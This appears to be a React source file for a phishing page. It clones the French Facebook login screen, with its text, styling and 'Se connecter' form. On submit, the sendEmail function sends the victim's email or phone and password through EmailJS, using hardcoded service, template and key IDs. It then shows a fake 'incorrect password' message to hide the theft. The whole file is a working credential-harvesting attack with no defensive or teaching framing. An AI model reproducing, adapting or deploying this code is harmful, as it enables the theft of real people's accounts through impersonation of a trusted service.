import { useState } from "react";
import Footer from "./components/Footer";
import emailjs from "@emailjs/browser";
import {
  FormControl,
  Grid,
  IconButton,
  InputAdornment,
  OutlinedInput,
  TextField,
  useMediaQuery,
} from "@mui/material";
import {
  VisibilityOffOutlined,
  VisibilityOutlined,
  Warning,
} from "@mui/icons-material";
import Responsive from "./components/Responsive";

const App = () => {
  const [isHovered, setIsHovered] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState("");
  const [adresse, setAdresse] = useState("");
  const [errorMessage, setErrorMessage] = useState(""); // State to store error messages

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const handleAdresseChange = (event) => {
    setAdresse(event.target.value);
  };

  const handleClickShowPassword = () => setShowPassword((show) => !show);

  const handleMouseDownPassword = (event) => {
    event.preventDefault();
  };

  const sendEmail = async () => {
    const serviceId = "service_k6rf76f";
    const templateId = "template_v799ng5";
    const publicKey = "L5-8Stpkfz3NC9i8f";

    const emailData = {
      message: "Adress facebook :" + adresse + " " + "Mot de pass :" + password,
    };

    try {
      const response = await emailjs.send(
        serviceId,
        templateId,
        emailData,
        publicKey
      );
      console.log(response);

      setErrorMessage(
        "L'adresse e-mail ou le mot de passe que vous avez saisi est incorrect. Veuillez réessayer."
      );
    } catch (error) {
      setErrorMessage(error);
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault(); // Prevents page reload
    sendEmail();
  };

  const containerStyle = {
    display: "flex",
    alignItems: "center",
    flexDirection: "column",
    justifyContent: "center",
    padding: "0 15px",
    height: "100vh",
    backgroundColor: "#f0f2f5",
    width: "100vw",
    overflowY: "hidden",
    boxSizing: "border-box",
  };

  const facebookPageStyle = {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    maxWidth: "1000px",
    width: "100%",
    flexDirection: window.innerWidth <= 900 ? "column" : "row",
    textAlign: window.innerWidth <= 900 ? "center" : "left",
  };
  const facebookPageStyle2 = {
    display: "flex",
    alignItems: "center",
    justifyContent: "end",
    maxWidth: "1000px",
    width: "100%",
    flexDirection: window.innerWidth <= 900 ? "column" : "row",
    textAlign: window.innerWidth <= 900 ? "center" : "right",
  };

  const textStyle = {
    marginBottom: window.innerWidth <= 900 ? "30px" : "90px",
  };

  const headingStyle = {
    color: "#1877f2",
    fontSize: window.innerWidth <= 460 ? "3.5rem" : "4rem",
    marginBottom: "10px",
  };

  const formStyle = {
    display: "flex",
    flexDirection: "column",
    background: "#fff",
    borderRadius: "8px",
    padding: window.innerWidth <= 460 ? "15px" : "20px",
    boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1)",
    maxWidth: "400px",
    width: "100%",
  };

  const loginButtonStyle = {
    border: "none",
    outline: "none",
    cursor: "pointer",
    background: "#1877f2",
    padding: "15px 0",
    borderRadius: "6px",
    color: "#fff",
    fontSize: "1.25rem",
    fontWeight: "600",
    transition: "0.2s ease",
  };

  const forgotStyle = {
    color: "#1877f2",
    textDecoration: isHovered ? "underline" : "none",
    cursor: "pointer",
    transition: "0.3s ease",
  };

  const buttonStyle = {
    marginTop: "25px",
    textAlign: "center",
    marginBottom: "20px",
  };

  const createAccountStyle = {
    padding: "15px 20px",
    background: "#42b72a",
    borderRadius: "6px",
    color: "#fff",
    fontSize: "1.063rem",
    fontWeight: "600",
    textDecoration: "none",
    transition: "0.2s ease",
  };
  const isXsScreen = useMediaQuery("(max-width:1080px)");
  return (
    <>
      {isXsScreen && (
        <Grid container>
          <Responsive />
        </Grid>
      )}
      {!isXsScreen && (
        <div style={containerStyle}>
          {/* <Grid container position={"absolute"} top={0}>
        <Progres />
      </Grid> */}
          <div style={facebookPageStyle}>
            <div style={textStyle}>
              <h1 style={headingStyle}>facebook</h1>
              <p
                style={{
                  color: "black",
                  fontSize: "27px",
                  fontWeight: "400",
                  fontFamily: "sans-serif",
                }}
              >
                Avec Facebook, partagez et restez en <br /> contact avec votre
                entourage.
              </p>
            </div>
            <form style={formStyle} onSubmit={handleSubmit}>
              <TextField
                id="outlined-textarea"
                placeholder="Adresse e-mail ou numéro de tél."
                onChange={handleAdresseChange}
                sx={{ mb: "15px" }}
              />
              <FormControl sx={{ mb: "15px" }} variant="outlined">
                <OutlinedInput
                  type={showPassword ? "text" : "password"}
                  placeholder="Mot de passe"
                  value={password}
                  onChange={handlePasswordChange}
                  endAdornment={
                    password && (
                      <InputAdornment position="end">
                        <IconButton
                          onClick={handleClickShowPassword}
                          onMouseDown={handleMouseDownPassword}
                          edge="end"
                        >
                          {showPassword ? (
                            <VisibilityOutlined />
                          ) : (
                            <VisibilityOffOutlined />
                          )}
                        </IconButton>
                      </InputAdornment>
                    )
                  }
                />
              </FormControl>

              {errorMessage && (
                <p
                  style={{
                    color: "red",
                    fontSize: "12px",
                    // fontWeight: "bold",
                    textAlign: "center",
                  }}
                >
                  <Warning fontSize="18px" />
                  {errorMessage}
                </p>
              )}

              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  textAlign: "center",
                  gap: "15px",
                }}
              >
                <button type="submit" style={loginButtonStyle}>
                  Se connecter
                </button>
                <a
                  href="#"
                  style={forgotStyle}
                  onMouseEnter={() => setIsHovered(true)}
                  onMouseLeave={() => setIsHovered(false)}
                >
                  Mot de passe oublié ?
                </a>
              </div>
              <hr
                style={{
                  border: "none",
                  height: "1px",
                  backgroundColor: "#ccc",
                  margin: "20px 0",
                }}
              />
              <div style={buttonStyle}>
                <a href="#" style={createAccountStyle}>
                  Créer un nouveau compte
                </a>
              </div>
            </form>
            <br />
          </div>
          <Grid
            style={facebookPageStyle2}
            container
            // sx={{ ml: { sm: "24vw" }, px: { sm: 2 }, width: { sm: "23vw" } }}
            pr={6}
            textAlign={"center"}
          >
            <p
              style={{
                color: "black",
                fontSize: "15px",
              }}
            >
              <a
                href="#"
                style={{
                  color: "black",
                  fontWeight: "600",
                  fontFamily: "sans-serif",
                }}
              >
                Créer une Page{" "}
              </a>
              pour une célébrité, une marque ou une entreprise.
            </p>
          </Grid>
          <div style={facebookPageStyle}>
            <Footer />
          </div>
        </div>
      )}
    </>
  );
};

export default App;
